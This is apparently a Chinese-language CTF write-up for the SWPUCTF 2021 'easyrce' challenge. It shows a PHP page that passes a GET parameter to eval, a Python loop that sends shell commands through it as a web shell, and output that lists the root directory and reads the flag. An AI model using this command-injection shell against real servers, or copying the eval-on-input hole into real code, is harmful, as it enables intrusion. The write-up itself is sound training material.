---
title: '[SWPUCTF 2021 新生赛]easyrce'
date: '2025-05-02T18:50:53+08:00'
weight: 
draft: false
description: '[SWPUCTF 2021 新生赛]easyrce'
---

存在 RCE 漏洞：`eval($_GET['url']);`

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?> 
```

构造 Web Shell

```python
import requests

url = 'http://node5.anna.nssctf.cn:27625/'

while True:
    cmd = input('> ')

    if cmd == 'quit':
        break

    payload = {'url': f'echo `{cmd}`;'}

    response = requests.get(url, params=payload)

    print(response.text)
```

列出 `/` 的所有文件

```shell
> ls /
<code><span style="color: #000000">
<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code>bin
boot
dev
etc
flllllaaaaaaggggggg
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

输出 `/flllllaaaaaaggggggg` 的内容

```shell
> cat /flllllaaaaaaggggggg
<code><span style="color: #000000">
<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code>NSSCTF{9e548da1-17a3-4796-9c5a-4a01febefd98}

> quit
```